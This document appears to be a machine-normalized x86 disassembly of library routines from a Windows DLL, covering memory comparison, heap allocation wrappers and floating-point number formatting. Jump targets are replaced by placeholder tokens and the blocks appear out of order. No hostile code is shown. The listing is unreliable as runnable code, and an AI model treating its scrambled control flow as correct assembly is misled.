jne r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
jmp r-xdata
mov esi [ eax + 0x10 ]
cmp esi [ ecx + 0x10 ]
je r-xdata
movzx esi [ eax + 0xd ]
movzx ebx [ ecx + 0xd ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax + 0xb ]
movzx ebx [ ecx + 0xb ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
test esi esi
jne r-xdata
xor esi esi
movzx ebx [ ecx + 0x10 ]
movzx esi [ eax + 0x10 ]
sub esi ebx
je r-xdata
movzx esi [ eax + 0xe ]
movzx ebx [ ecx + 0xe ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
test esi esi
jne r-xdata
test esi esi
jne r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
jmp r-xdata
mov esi [ eax + 0x14 ]
cmp esi [ ecx + 0x14 ]
je r-xdata
movzx esi [ eax + 0x11 ]
movzx ebx [ ecx + 0x11 ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax + 0xf ]
movzx ebx [ ecx + 0xf ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
test esi esi
jne r-xdata
xor esi esi
movzx esi [ eax + 0x14 ]
movzx ebx [ ecx + 0x14 ]
sub esi ebx
je r-xdata
movzx esi [ eax + 0x12 ]
movzx ebx [ ecx + 0x12 ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
test esi esi
jne r-xdata
test esi esi
jne r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
jmp r-xdata
mov esi [ eax + 0x18 ]
cmp esi [ ecx + 0x18 ]
je r-xdata
movzx esi [ eax + 0x15 ]
movzx ebx [ ecx + 0x15 ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax + 0x13 ]
movzx ebx [ ecx + 0x13 ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
test esi esi
jne r-xdata
xor esi esi
movzx esi [ eax + 0x18 ]
movzx ebx [ ecx + 0x18 ]
sub esi ebx
je r-xdata
movzx esi [ eax + 0x16 ]
movzx ebx [ ecx + 0x16 ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
test esi esi
jne r-xdata
test esi esi
jne r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
jmp r-xdata
mov esi [ eax + 0x1c ]
cmp esi [ ecx + 0x1c ]
je r-xdata
movzx esi [ eax + 0x19 ]
movzx ebx [ ecx + 0x19 ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax + 0x17 ]
movzx ebx [ ecx + 0x17 ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
test esi esi
jne r-xdata
xor esi esi
movzx esi [ eax + 0x1c ]
movzx ebx [ ecx + 0x1c ]
sub esi ebx
je r-xdata
movzx esi [ eax + 0x1a ]
movzx ebx [ ecx + 0x1a ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
test esi esi
jne r-xdata
test esi esi
jne r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
jmp r-xdata
add eax edx
add ecx edx
sub edi edx
movzx esi [ eax + 0x1d ]
movzx ebx [ ecx + 0x1d ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax + 0x1b ]
movzx ebx [ ecx + 0x1b ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax + 0x1e ]
movzx ebx [ ecx + 0x1e ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
test esi esi
jne r-xdata
test esi esi
jne r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
jmp r-xdata
movzx esi [ eax + 0x1f ]
movzx ebx [ ecx + 0x1f ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
test esi esi
jne r-xdata
test esi esi
jne r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
jmp r-xdata
sub_10021ac6
mov edi edi
push ebp
mov ebp esp
push ecx
and [ ebp - 0x4 ] 0x0
push ebx
mov ebx [ ebp + 0x10 ]
test ebx ebx
jne r-xdata
push esi
cmp ebx 0x4
jb r-xdata
xor eax eax
jmp r-xdata
mov ecx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
lea esi [ ebx - 0x4 ]
test esi esi
je r-xdata
pop ebx
leave
retn
cmp esi ebx
jb r-xdata
mov ecx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
mov dl [ eax ]
test dl dl
je r-xdata
xor eax eax
movzx eax [ eax - 0x4 ]
movzx ecx [ ecx - 0x4 ]
jmp r-xdata
cmp dl [ ecx - 0x4 ]
jne r-xdata
movzx eax [ eax ]
movzx ecx [ ecx ]
cmp dl [ ecx ]
jne r-xdata
sub eax ecx
jmp r-xdata
mov dl [ eax - 0x3 ]
test dl dl
je r-xdata
pop esi
inc eax
inc esi
inc ecx
movzx eax [ eax - 0x3 ]
movzx ecx [ ecx - 0x3 ]
jmp r-xdata
cmp dl [ ecx - 0x3 ]
jne r-xdata
mov dl [ eax - 0x2 ]
test dl dl
je r-xdata
movzx eax [ eax - 0x2 ]
movzx ecx [ ecx - 0x2 ]
jmp r-xdata
cmp dl [ ecx - 0x2 ]
jne r-xdata
mov dl [ eax - 0x1 ]
test dl dl
je r-xdata
movzx eax [ eax - 0x1 ]
movzx ecx [ ecx - 0x1 ]
jmp r-xdata
cmp dl [ ecx - 0x1 ]
jne r-xdata
add [ ebp - 0x4 ] 0x4
cmp [ ebp - 0x4 ] esi
jb r-xdata
mov dl [ eax ]
add eax 0x4
add ecx 0x4
test dl dl
je r-xdata
jmp r-xdata
mov esi [ ebp - 0x4 ]
jmp r-xdata
sub_10021b90
push ebp
mov ebp esp
push esi
xor eax eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
mov edx [ ebp + 0xc ]
lea ecx [ ecx ]
mov esi [ ebp + 0x8 ]
mov edi edi
add edx 0x1
bts [ esp ] eax
jmp r-xdata
add esp 0x20
pop esi
leave
retn
add esi 0x1
bt [ esp ] eax
jae r-xdata
mov al [ edx ]
or al al
je r-xdata
mov al [ esi ]
or al al
je r-xdata
lea eax [ esi - 0x1 ]
sub_10021bd0
mov edi edi
push ebp
mov ebp esp
xor eax eax
cmp [ ebp + 0xc ] eax
jbe r-xdata
pop ebp
retn
mov ecx [ ebp + 0x8 ]
inc eax
add ecx 0x2
cmp eax [ ebp + 0xc ]
jb r-xdata
cmp [ ecx ] 0x0
je r-xdata
sub_10021bf0
push esi
mov eax [ esp + 0x14 ]
or eax eax
jne r-xdata
mov ecx eax
mov ebx [ esp + 0x10 ]
mov edx [ esp + 0xc ]
mov eax [ esp + 0x8 ]
mov ecx [ esp + 0x10 ]
mov eax [ esp + 0xc ]
xor edx edx
div ecx
mov ebx eax
mov eax [ esp + 0x8 ]
div ecx
mov esi eax
mov eax ebx
mul [ esp + 0x10 ]
mov ecx eax
mov eax esi
mul [ esp + 0x10 ]
add edx ecx
jmp r-xdata
shr ecx 0x1
rcr ebx 0x1
shr edx 0x1
rcr eax 0x1
or ecx ecx
jne r-xdata
div ebx
mov esi eax
mul [ esp + 0x14 ]
mov ecx eax
mov eax [ esp + 0x10 ]
mul esi
add edx ecx
jb r-xdata
sub eax [ esp + 0x8 ]
sbb edx [ esp + 0xc ]
neg edx
neg eax
sbb edx 0x0
mov ecx edx
mov edx ebx
mov ebx ecx
mov ecx eax
mov eax esi
pop esi
retn 0x10
dec esi
sub eax [ esp + 0x10 ]
sbb edx [ esp + 0x14 ]
cmp edx [ esp + 0xc ]
ja r-xdata
jb r-xdata
xor ebx ebx
cmp eax [ esp + 0x8 ]
jbe r-xdata
sub_10021c85
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
test ecx ecx
je r-xdata
imul ecx [ ebp + 0xc ]
push esi
mov esi ecx
test esi esi
jne r-xdata
push 0xffffffe0
xor edx edx
pop eax
div ecx
cmp eax [ ebp + 0xc ]
jae r-xdata
xor eax eax
cmp esi 0xffffffe0
ja r-xdata
inc esi
call sub_10017e85
mov [ eax ] 0xc
xor eax eax
pop ebp
retn
cmp [ rw-data ] 0x0
je r-xdata
push esi
push 0x8
push [ rw-data ]
call [ HeapAlloc@IAT ]
test eax eax
jne r-xdata
mov ecx [ ebp + 0x10 ]
test ecx ecx
je r-xdata
push esi
call sub_1001b6b7
pop ecx
test eax eax
jne r-xdata
pop esi
pop ebp
retn
mov [ ecx ] 0xc
mov eax [ ebp + 0x10 ]
test eax eax
je r-xdata
xor eax eax
jmp r-xdata
mov [ eax ] 0xc
sub_10021d07
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
push esi
mov esi [ ebp + 0xc ]
test esi esi
jne r-xdata
push [ ebp + 0xc ]
call sub_10019b49
pop ecx
pop ebp
retn
push edi
jmp r-xdata
push [ ebp + 0x8 ]
call sub_1001750d
pop ecx
xor eax eax
jmp r-xdata
cmp esi 0xffffffe0
jbe r-xdata
pop esi
pop ebp
retn
test esi esi
jne r-xdata
push esi
call sub_1001b6b7
pop ecx
call sub_10017e85
mov [ eax ] 0xc
push esi
push [ ebp + 0x8 ]
push 0x0
push [ rw-data ]
call [ HeapReAlloc@IAT ]
mov edi eax
test edi edi
jne r-xdata
inc esi
mov eax edi
jmp r-xdata
cmp [ rw-data ] eax
je r-xdata
pop edi
call sub_10017e85
mov esi eax
call [ GetLastError@IAT ]
push eax
call sub_10017e43
pop ecx
mov [ esi ] eax
push esi
call sub_1001b6b7
pop ecx
test eax eax
je r-xdata
call sub_10017e85
mov esi eax
call [ GetLastError@IAT ]
push eax
call sub_10017e43
pop ecx
mov [ esi ] eax
jmp r-xdata
xor eax eax
sub_10021dec
mov edi edi
push ebp
mov ebp esp
sub esp 0x18
push ebx
push [ ebp + 0x10 ]
lea ecx [ ebp - 0x18 ]
call sub_100176e6
mov ebx [ ebp + 0x8 ]
lea eax [ ebx + 0x1 ]
cmp eax 0x100
ja r-xdata
mov [ ebp + 0x8 ] ebx
sar [ ebp + 0x8 ] 0x8
lea eax [ ebp - 0x18 ]
push eax
mov eax [ ebp + 0x8 ]
and eax 0xff
push eax
call sub_100229ce
pop ecx
pop ecx
test eax eax
je r-xdata
mov eax [ ebp - 0x18 ]
mov eax [ eax + 0xc8 ]
movzx eax [ eax + ebx * 2 ]
jmp r-xdata
xor ecx ecx
mov [ ebp - 0x8 ] bl
mov [ ebp - 0x7 ] 0x0
inc ecx
mov al [ ebp + 0x8 ]
push 0x2
mov [ ebp - 0x8 ] al
mov [ ebp - 0x7 ] bl
mov [ ebp - 0x6 ] 0x0
pop ecx
jmp r-xdata
and eax [ ebp + 0xc ]
cmp [ ebp - 0xc ] 0x0
je r-xdata
movzx eax [ ebp - 0x4 ]
cmp [ ebp - 0xc ] al
je r-xdata
mov eax [ ebp - 0x18 ]
push 0x1
push [ eax + 0x14 ]
push [ eax + 0x4 ]
lea eax [ ebp - 0x4 ]
push eax
push ecx
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x18 ]
push 0x1
push eax
call sub_1001e34b
add esp 0x20
test eax eax
jne r-xdata
pop ebx
leave
retn
mov ecx [ ebp - 0x10 ]
and [ ecx + 0x70 ] 0xfffffffd
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x10 ]
and [ eax + 0x70 ] 0xfffffffd
sub_10021eb6
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push esi
push [ ebp + 0xc ]
lea ecx [ ebp - 0x10 ]
call sub_100176e6
mov esi [ ebp + 0x8 ]
movsx eax [ esi ]
push eax
call sub_1001b0c5
cmp eax 0x65
jmp r-xdata
pop ecx
jne r-xdata
inc esi
movzx eax [ esi ]
push eax
call sub_1001a1a1
test eax eax
movsx eax [ esi ]
push eax
call sub_1001b0c5
pop ecx
cmp eax 0x78
jne r-xdata
mov ecx [ ebp - 0x10 ]
mov ecx [ ecx + 0xbc ]
mov ecx [ ecx ]
mov al [ esi ]
mov cl [ ecx ]
mov [ esi ] cl
inc esi
add esi 0x2
mov cl [ esi ]
mov [ esi ] al
mov al cl
mov cl [ esi ]
inc esi
test cl cl
jne r-xdata
pop esi
cmp [ ebp - 0x4 ] cl
je r-xdata
leave
retn
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
sub_10021f2a
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push esi
push [ ebp + 0xc ]
lea ecx [ ebp - 0x10 ]
call sub_100176e6
mov eax [ ebp + 0x8 ]
mov cl [ eax ]
mov esi [ ebp - 0x10 ]
test cl cl
je r-xdata
mov cl [ eax ]
inc eax
test cl cl
je r-xdata
mov edx [ esi + 0xbc ]
mov edx [ edx ]
mov dl [ edx ]
cmp [ ebp - 0x4 ] 0x0
pop esi
je r-xdata
jmp r-xdata
inc eax
mov cl [ eax ]
test cl cl
jne r-xdata
leave
retn
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
mov cl [ eax ]
test cl cl
jne r-xdata
cmp cl dl
je r-xdata
cmp cl 0x65
je r-xdata
mov edx eax
cmp cl 0x45
je r-xdata
dec eax
cmp [ eax ] 0x30
je r-xdata
mov ecx [ esi + 0xbc ]
mov ecx [ ecx ]
push ebx
mov bl [ eax ]
cmp bl [ ecx ]
pop ebx
jne r-xdata
inc eax
mov cl [ edx ]
inc eax
inc edx
mov [ eax ] cl
test cl cl
jne r-xdata
dec eax
sub_10021fac
mov edi edi
push ebp
mov ebp esp
fldz
mov eax [ ebp + 0x8 ]
fcomp [ eax ]
fnstsw ax
test ah 0x41
jpe r-xdata
xor eax eax
pop ebp
retn
xor eax eax
inc eax
pop ebp
retn
sub_10021fc8
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
cmp [ ebp + 0x8 ] 0x0
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
je r-xdata
lea eax [ ebp + 0x8 ]
push eax
call sub_100253a5
mov eax [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
mov [ eax ] ecx
lea eax [ ebp - 0x8 ]
push eax
call sub_100252fd
mov ecx [ ebp - 0x8 ]
mov eax [ ebp + 0xc ]
mov [ eax ] ecx
mov ecx [ ebp - 0x4 ]
mov [ eax + 0x4 ] ecx
jmp r-xdata
add esp 0xc
leave
retn
sub_10022024
mov edi edi
push esi
mov esi eax
test edi edi
je r-xdata
pop esi
retn
push esi
call sub_10018330
inc eax
push eax
push esi
add esi edi
push esi
call sub_10017050
add esp 0x10
sub_10022069
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
push esi
push [ ebp + 0x1c ]
lea ecx [ ebp - 0x10 ]
mov ebx eax
call sub_100176e6
xor ecx ecx
cmp ebx ecx
jne r-xdata
cmp [ ebp + 0x8 ] ecx
jbe r-xdata
call sub_10017e85
push 0x16
cmp [ ebp + 0xc ] ecx
jle r-xdata
mov eax esi
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
xor eax eax
mov eax [ ebp + 0xc ]
jmp r-xdata
push edi
cmp [ ebp + 0x18 ] cl
je r-xdata
call sub_10017e85
push 0x22
jmp r-xdata
add eax 0x9
cmp [ ebp + 0x8 ] eax
ja r-xdata
mov edi [ ebp + 0x14 ]
cmp [ edi ] 0x2d
mov esi ebx
jne r-xdata
mov edx [ ebp + 0x14 ]
xor eax eax
cmp [ ebp + 0xc ] ecx
setg al
xor ecx ecx
cmp [ edx ] 0x2d
sete cl
mov edi eax
add ecx ebx
mov eax ecx
call sub_10022024
pop esi
mov [ eax ] esi
call sub_1001b8e4
cmp [ ebp - 0x4 ] 0x0
je r-xdata
cmp [ ebp + 0xc ] 0x0
jle r-xdata
mov [ ebx ] 0x2d
lea esi [ ebx + 0x1 ]
xor eax eax
cmp [ ebp + 0x18 ] al
sete al
add eax [ ebp + 0xc ]
add esi eax
cmp [ ebp + 0x8 ] 0xffffffff
jne r-xdata
mov cl [ esi + 0x1 ]
mov eax [ ebp - 0x10 ]
mov [ esi ] cl
mov eax [ eax + 0xbc ]
mov eax [ eax ]
mov al [ eax ]
inc esi
mov [ esi ] al
sub ebx esi
add ebx [ ebp + 0x8 ]
or ebx 0xffffffff
jmp r-xdata
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_1001b892
int3
lea ecx [ esi + 0x2 ]
cmp [ ebp + 0x10 ] eax
je r-xdata
push r--data
push ebx
push esi
call sub_1001b438
add esp 0xc
test eax eax
jne r-xdata
mov eax [ edi + 0xc ]
cmp [ eax ] 0x30
je r-xdata
mov [ esi ] 0x45
test [ rw-data ] 0x1
pop edi
je r-xdata
mov eax [ edi + 0x4 ]
dec eax
jns r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
cmp [ ecx ] 0x30
jne r-xdata
cmp eax 0x64
jl r-xdata
neg eax
mov [ esi + 0x1 ] 0x2d
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
push 0x3
lea eax [ ecx + 0x1 ]
push eax
push ecx
call sub_10017050
add esp 0xc
cmp eax 0xa
jl r-xdata
cdq
push 0x64
pop edi
idiv edi
add [ esi + 0x2 ] al
mov eax edx
pop esi
pop ebx
leave
retn
add [ esi + 0x4 ] al
cdq
push 0xa
pop edi
idiv edi
add [ esi + 0x3 ] al
mov eax edx
sub_100221ca
mov edi edi
push ebp
mov ebp esp
sub esp 0x2c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebx
push esi
mov esi [ ebp + 0x14 ]
push edi
mov edi [ ebp + 0xc ]
push 0x16
pop ebx
push ebx
lea ecx [ ebp - 0x1c ]
push ecx
lea ecx [ ebp - 0x2c ]
push ecx
push [ eax + 0x4 ]
push [ eax ]
call sub_100255b3
add esp 0x14
test edi edi
jne r-xdata
mov eax [ ebp + 0x10 ]
test eax eax
je r-xdata
call sub_10017e85
mov [ eax ] ebx
call sub_1001b8e4
mov eax ebx
jmp r-xdata
cmp eax 0xffffffff
jne r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_10016ec3
leave
retn
xor ecx ecx
cmp [ ebp - 0x2c ] 0x2d
sete cl
sub eax ecx
xor ecx ecx
test esi esi
setg cl
sub eax ecx
or eax eax
jmp r-xdata
push [ ebp + 0x1c ]
lea eax [ ebp - 0x2c ]
push 0x0
push eax
push [ ebp + 0x18 ]
mov eax edi
push esi
push [ ebp + 0x10 ]
call sub_10022069
add esp 0x18
mov [ edi ] 0x0
jmp r-xdata
lea ecx [ ebp - 0x2c ]
push ecx
lea ecx [ esi + 0x1 ]
push ecx
push eax
xor eax eax
cmp [ ebp - 0x2c ] 0x2d
sete al
xor ecx ecx
test esi esi
setg cl
add eax edi
add ecx eax
push ecx
call sub_1002544d
add esp 0x10
test eax eax
je r-xdata
sub_10022291
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_100221ca
add esp 0x18
pop ebp
retn
sub_100222b1
mov edi edi
push ebp
mov ebp esp
sub esp 0x24
push esi
push edi
push [ ebp + 0x1c ]
lea ecx [ ebp - 0x24 ]
mov [ ebp - 0x14 ] 0x3ff
xor edi edi
mov [ ebp - 0x4 ] 0x30
call sub_100176e6
cmp [ ebp + 0x14 ] edi
jge r-xdata
mov esi [ ebp + 0xc ]
cmp esi edi
jne r-xdata
mov [ ebp + 0x14 ] edi
cmp [ ebp + 0x10 ] edi
jbe r-xdata
call sub_10017e85
push 0x16
mov eax [ ebp + 0x14 ]
add eax 0xb
mov [ esi ] 0x0
cmp [ ebp + 0x10 ] eax
ja r-xdata
mov eax esi
jmp r-xdata
mov eax [ ebp - 0x1c ]
and [ eax + 0x70 ] 0xfffffffd
mov edi [ ebp + 0x8 ]
mov eax [ edi ]
mov [ ebp - 0xc ] eax
mov eax [ edi + 0x4 ]
mov ecx eax
shr ecx 0x14
mov edx 0x7ff
push ebx
and ecx edx
xor ebx ebx
cmp ecx edx
jne r-xdata
call sub_10017e85
push 0x22
jmp r-xdata
pop edi
pop esi
leave
retn
and eax 0x80000000
xor ecx ecx
or ecx eax
je r-xdata
test ebx ebx
jne r-xdata
pop esi
mov [ eax ] esi
call sub_1001b8e4
cmp [ ebp - 0x18 ] 0x0
je r-xdata
mov ebx [ ebp + 0x18 ]
test ebx ebx
sete al
dec al
and al 0xe0
add al 0x78
neg ebx
sbb ebx ebx
mov [ esi ] 0x30
mov [ esi + 0x1 ] al
mov ecx [ edi + 0x4 ]
and ebx 0xffffffe0
and ecx 0x7ff00000
xor eax eax
add ebx 0x27
xor edx edx
or eax ecx
jne r-xdata
mov [ esi ] 0x2d
inc esi
mov eax [ ebp + 0x10 ]
cmp eax 0xffffffff
jne r-xdata
mov [ esi + 0x2 ] 0x31
add esi 0x3
mov [ esi + 0x2 ] 0x30
mov ecx [ edi + 0x4 ]
mov eax [ edi ]
and ecx 0xfffff
add esi 0x3
or eax ecx
jne r-xdata
add eax 0xfffffffe
or eax eax
jmp r-xdata
mov ecx [ ebp - 0x24 ]
mov ecx [ ecx + 0xbc ]
mov ecx [ ecx ]
mov cl [ ecx ]
mov [ eax ] cl
mov [ eax ] dl
jmp r-xdata
mov [ ebp - 0x14 ] 0x3fe
jmp r-xdata
mov [ ebp - 0x14 ] edx
jmp r-xdata
cmp [ ebx ] 0x2d
jne r-xdata
cmp [ ebp - 0x18 ] 0x0
mov [ esi ] 0x0
je r-xdata
push 0x0
push [ ebp + 0x14 ]
lea ebx [ esi + 0x2 ]
push eax
push ebx
push edi
call sub_10022291
add esp 0x14
test eax eax
je r-xdata
mov [ ebp - 0xc ] edx
mov [ ebp - 0x8 ] 0xf0000
cmp eax edx
jbe r-xdata
mov ecx [ edi + 0x4 ]
mov eax [ edi ]
and ecx 0xfffff
mov [ ebp - 0x8 ] ecx
ja r-xdata
mov eax esi
inc esi
mov [ ebp + 0xc ] eax
cmp [ ebp + 0x14 ] edx
jne r-xdata
cmp [ ebp + 0x18 ] 0x0
mov [ esi ] 0x30
sete al
dec al
and al 0xe0
add al 0x78
mov [ esi + 0x1 ] al
push 0x65
add esi 0x2
push esi
call sub_100252d0
pop ecx
pop ecx
test eax eax
je r-xdata
mov [ esi ] 0x2d
inc esi
pop ebx
mov ecx [ ebp - 0x1c ]
and [ ecx + 0x70 ] 0xfffffffd
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
jl r-xdata
mov edx [ edi + 0x4 ]
and edx [ ebp - 0x8 ]
mov eax [ edi ]
movsx ecx [ ebp - 0x4 ]
and eax [ ebp - 0xc ]
and edx 0xfffff
call sub_10025730
add ax 0x30
movzx eax ax
cmp eax 0x39
jbe r-xdata
cmp [ ebp + 0x14 ] 0x0
jle r-xdata
cmp [ ebp - 0x18 ] 0x0
je r-xdata
cmp [ ebp + 0x18 ] 0x0
sete cl
dec cl
and cl 0xe0
add cl 0x70
mov [ eax ] cl
mov [ eax + 0x3 ] 0x0
jmp r-xdata
mov edx [ edi + 0x4 ]
and edx [ ebp - 0x8 ]
mov eax [ edi ]
movsx ecx [ ebp - 0x4 ]
and eax [ ebp - 0xc ]
and edx 0xfffff
call sub_10025730
cmp ax 0x8
jbe r-xdata
mov ecx [ ebp - 0x8 ]
sub [ ebp - 0x4 ] 0x4
mov [ esi ] al
mov eax [ ebp - 0xc ]
shrd eax ecx 0x4
shr ecx 0x4
inc esi
dec [ ebp + 0x14 ]
cmp [ ebp - 0x4 ] 0x0
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] ecx
jge r-xdata
add eax ebx
mov eax [ ebp + 0xc ]
cmp [ eax ] 0x0
jne r-xdata
push [ ebp + 0x14 ]
push 0x30
push esi
call sub_1001b6e0
add esp 0xc
add esi [ ebp + 0x14 ]
xor eax eax
mov eax [ ebp - 0x1c ]
and [ eax + 0x70 ] 0xfffffffd
lea eax [ esi - 0x1 ]
cmp [ ebp + 0x14 ] 0x0
jle r-xdata
cmp [ ebp + 0x18 ] 0x0
mov cl 0x34
sete al
dec al
and al 0xe0
add al 0x70
mov [ esi ] al
mov eax [ edi ]
mov edx [ edi + 0x4 ]
call sub_10025730
xor ebx ebx
and eax 0x7ff
and edx ebx
sub eax [ ebp - 0x14 ]
push ebx
pop ecx
sbb edx ecx
js r-xdata
mov esi eax
mov [ eax ] 0x30
dec eax
jmp r-xdata
cmp cl 0x46
jne r-xdata
mov [ esi + 0x1 ] 0x2d
add esi 0x2
neg eax
adc edx ebx
neg edx
jg r-xdata
mov cl [ eax ]
cmp cl 0x66
je r-xdata
cmp eax [ ebp + 0xc ]
je r-xdata
test edx edx
jl r-xdata
mov ecx 0x3e8
jg r-xdata
mov [ esi + 0x1 ] 0x2b
add esi 0x2
jmp r-xdata
cmp eax ebx
jb r-xdata
inc [ eax - 0x1 ]
mov cl [ eax ]
cmp cl 0x39
jne r-xdata
cmp esi edi
jne r-xdata
jg r-xdata
push ebx
push ecx
push edx
push eax
call sub_10025650
add al 0x30
mov [ esi ] al
inc esi
mov [ ebp - 0x10 ] edx
mov eax ecx
mov edx ebx
cmp esi edi
jne r-xdata
cmp eax ecx
jb r-xdata
mov edi esi
mov [ esi ] 0x30
cmp edx ebx
jl r-xdata
inc cl
mov [ eax ] cl
jmp r-xdata
add bl 0x3a
mov [ eax ] bl
jmp r-xdata
push 0x0
push 0xa
push edx
push eax
call sub_10025650
add al 0x30
mov [ esi ] al
mov [ ebp - 0x10 ] edx
inc esi
mov eax ecx
mov [ ebp - 0x10 ] ebx
test edx edx
jl r-xdata
push 0x0
push 0x64
push edx
push eax
call sub_10025650
add al 0x30
mov [ esi ] al
mov [ ebp - 0x10 ] edx
inc esi
mov eax ecx
mov edx ebx
cmp eax 0x64
jb r-xdata
add al 0x30
mov [ esi ] al
mov [ esi + 0x1 ] 0x0
jg r-xdata
cmp eax 0xa
jb r-xdata
sub_10022627
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
push esi
push edi
push [ ebp + 0x14 ]
mov edi eax
mov esi [ edi + 0x4 ]
mov ebx ecx
lea ecx [ ebp - 0x10 ]
dec esi
call sub_100176e6
test ebx ebx
jne r-xdata
cmp [ ebp + 0x8 ] 0x0
jbe r-xdata
call sub_10017e85
push 0x16
pop esi
mov [ eax ] esi
call sub_1001b8e4
cmp [ ebp - 0x4 ] 0x0
je r-xdata
cmp [ ebp + 0x10 ] 0x0
je r-xdata
mov eax esi
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
cmp [ edi ] 0x2d
mov esi ebx
jne r-xdata
cmp esi [ ebp + 0xc ]
jne r-xdata
pop edi
pop esi
pop ebx
leave
retn
mov eax [ edi + 0x4 ]
test eax eax
jg r-xdata
mov [ ebx ] 0x2d
lea esi [ ebx + 0x1 ]
xor eax eax
